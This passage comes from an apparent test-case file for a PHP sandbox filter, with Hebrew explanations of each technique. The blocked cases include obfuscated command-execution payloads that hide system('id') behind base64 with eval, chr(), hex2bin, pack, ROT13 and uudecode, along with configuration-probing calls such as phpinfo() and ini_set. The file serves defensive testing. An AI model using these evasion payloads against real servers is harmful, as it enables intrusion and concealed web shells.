      - פרטי קונפיגורציה של השרת
    `,
  },
  {
    name: 'PHP: apache_setenv',
    code: `<?php apache_setenv('TEST', 'value'); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 התקפה: שינוי סביבת Apache
      
      איך האקרים משתמשים בזה:
      הגדרת משתני סביבה של Apache.
      זה יכול להשפיע על עיבוד הבקשה.
      
      השפעה בעולם האמיתי:
      - שינוי התנהגות Apache
      - השפעה על עיבוד downstream
      - תקיפות מבוססות סביבה
    `,
  },
  {
    name: 'PHP: phpinfo()',
    code: `<?php phpinfo(); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 התקפה: חשיפת קונפיגורציית PHP מלאה
      
      איך האקרים משתמשים בזה:
      phpinfo() חושפת את כל קונפיגורציית PHP.
      עבור תוקפים זו מכרה זהב לתכנון ניצול.
      
      השפעה בעולם האמיתי:
      - גרסת PHP ומודולים מותקנים
      - נתיבי שרת
      - משתני סביבה
      - הרחבות טעונות שאפשר לנצל
    `,
  },
  {
    name: 'PHP: ini_get',
    code: `<?php echo ini_get('open_basedir'); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 התקפה: קריאת קונפיגורציית PHP
      
      איך האקרים משתמשים בזה:
      ini_get() קוראת ערכי הגדרה של PHP.
      היא חושפת מגבלות והגדרות אבטחה.
      
      השפעה בעולם האמיתי:
      - בדיקת disable_functions
      - מציאת מגבלות open_basedir
      - גילוי misconfigurations אבטחתיים
    `,
  },
  {
    name: 'PHP: ini_set',
    code: `<?php ini_set('display_errors', 1); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 התקפה: שינוי קונפיגורציית PHP
      
      איך האקרים משתמשים בזה:
      ini_set() משנה הגדרות PHP בזמן ריצה.
      כך ניתן להחליש הגדרות אבטחה.
      
      השפעה בעולם האמיתי:
      - הפעלת הצגת שגיאות לצורך דליפת מידע
      - שינוי מגבלות זיכרון
      - שינוי הגדרות הרצה
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // ENCODING BYPASS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'PHP: base64_decode bypass',
    code: `<?php eval(base64_decode('c3lzdGVtKCdpZCcp')); ?>`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 התקפה: Payload מקודד ב-Base64
      
      איך האקרים משתמשים בזה:
      Base64 מסתיר קוד זדוני מפילטרים.
      'c3lzdGVtKCdpZCcp' מפוענח ל-system('id').
      
      השפעה בעולם האמיתי:
      - עקיפת פילטרים מבוססי תבניות מחרוזת
      - נפוץ ב-web shells
      - טכניקת הסוואה סטנדרטית
    `,
  },
  {
    name: 'PHP: chr() bypass',
    code: `<?php $f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $f('id'); ?>`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 התקפה: בניית שם פונקציה מקודי תווים
      
      איך האקרים משתמשים בזה:
      בונים שמות פונקציות באמצעות chr().
      chr(115).chr(121)... שווה ל-'system'.
      
      השפעה בעולם האמיתי:
      - עקיפת פילטרים לשמות פונקציות
      - בניית פונקציות דינמית
      - הסוואה נפוצה ב-malware
    `,
  },
  {
    name: 'PHP: hex2bin bypass',
    code: `<?php $cmd = hex2bin('73797374656d'); $cmd('id'); ?>`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 התקפה: שם פונקציה מקודד ב-Hex
      
      איך האקרים משתמשים בזה:
      hex2bin() ממירה hex לבינארי/מחרוזת.
      '73797374656d' שווה ל-'system' ב-hex.
      
      השפעה בעולם האמיתי:
      - חלופה ל-base64
      - קידוד שנראה פחות חשוד
      - הסוואת שמות פונקציות
    `,
  },
  {
    name: 'PHP: pack() bypass',
    code: `<?php $f = pack('H*', '73797374656d'); $f('id'); ?>`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 התקפה: שימוש ב-pack לצורך קידוד
      
      איך האקרים משתמשים בזה:
      pack() ממירה מידע בין פורמטים.
      ניתן לבנות באמצעותה מחרוזות מקידודים שונים.
      
      השפעה בעולם האמיתי:
      - קידוד/פענוח גמיש
      - אפשרויות פורמט רבות
      - שרשראות הסוואה מורכבות
    `,
  },
  {
    name: 'PHP: str_rot13 bypass',
    code: `<?php $f = str_rot13('flfgrz'); $f('id'); ?>`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 התקפה: הסוואת ROT13
      
      איך האקרים משתמשים בזה:
      str_rot13() היא החלפת אותיות פשוטה.
      'flfgrz' ב-ROT13 שווה ל-'system'.
      
      השפעה בעולם האמיתי:
      - הסוואה פשוטה אבל אפקטיבית
      - קל ליישום ולהיפוך
      - עוקפת בדיקות מחרוזת נאיביות
    `,
  },
  {
    name: 'PHP: gzinflate bypass',
    code: `<?php eval(gzinflate(base64_decode('compressed_payload'))); ?>`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 התקפה: Payload דחוס
      
      איך האקרים משתמשים בזה:
      gzinflate() פורסת מידע דחוס.
      בשילוב עם base64 היא מסתירה payloads גדולים.
      
      השפעה בעולם האמיתי:
      - payloads מקודדים קטנים יותר
      - קשה יותר לניתוח
      - נפוץ ב-malware מתוחכם
    `,
  },
  {
    name: 'PHP: convert_uuencode bypass',
    code: "<?php $f = convert_uudecode('&<WES=&5M\`'); $f('id'); ?>",
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 התקפה: הסוואת UUEncode
      
      איך האקרים משתמשים בזה:
      UUencode הוא פורמט קידוד ישן יותר.
      הוא עשוי לעקוף פילטרים שבודקים רק קידודים נפוצים.
      
      השפעה בעולם האמיתי:
      - שיטת קידוד חלופית
      - פחות נפוץ בפילטרים
      - קידוד לא שגרתי לצורכי התחמקות
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SAFE CODE
  // ════════════════════════════════════════════════════════════════
  {
    name: 'PHP: Safe echo',
    code: `<?php echo 'Hello, World!'; ?>`,
    expectBlocked: false,
    expectedOutput: 'Hello, World!',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: פלט בסיסי
      
      זה קוד לגיטימי שאמור לרוץ:
      echo היא פעולה בסיסית לפלט ב-PHP
      ואינה מהווה סיכון אבטחתי.
    `,
  },
  {
    name: 'PHP: Safe math',
    code: `<?php echo 2 + 2; ?>`,
    expectBlocked: false,
    expectedOutput: '4',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: פעולות מתמטיות
      
      זה קוד לגיטימי שאמור לרוץ:
      חשבון בסיסי הוא חלק חיוני מכל תכנות.
    `,
  },
  {
    name: 'PHP: Safe array',
    code: `<?php $arr = [1, 2, 3]; $doubled = []; foreach($arr as $x) { $doubled[] = $x * 2; } echo implode(',', $doubled); ?>`,
    expectBlocked: false,
    expectedOutput: '2,4,6',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: פעולות מערך עם foreach
      
      זה קוד לגיטימי שאמור לרוץ:
      שימוש בלולאות foreach לשינוי מערכים הוא בטוח.
      פונקציות callback על מערכים כמו array_map נחסמות
      כי ניתן להפוך אותן לכלי תקיפה באמצעות callbacks כמחרוזת.
    `,
  },
  {
    name: 'PHP: Safe class',
    code: `<?php
class Point {
    public int $x;
    public int $y;
    public function __construct(int $x, int $y) {
        $this->x = $x;
        $this->y = $y;
    }
}
$p = new Point(3, 4);
echo $p->x + $p->y;
?>`,
    expectBlocked: false,
    expectedOutput: '7',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: PHP מונחה עצמים
      
      זה קוד לגיטימי שאמור לרוץ:
      הגדרת מחלקות ויצירת אובייקטים
      הן יכולות ליבה של PHP.
    `,
  },
  {
    name: 'PHP: Safe string operations',
    code: `<?php echo strtoupper('hello'); ?>`,
    expectBlocked: false,
    expectedOutput: 'HELLO',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: עיבוד מחרוזות
      
      זה קוד לגיטימי שאמור לרוץ:
      פונקציות מחרוזת לעיצוב ולמניפולציה
      הן בטוחות ונמצאות בשימוש נפוץ.
    `,
  },
];
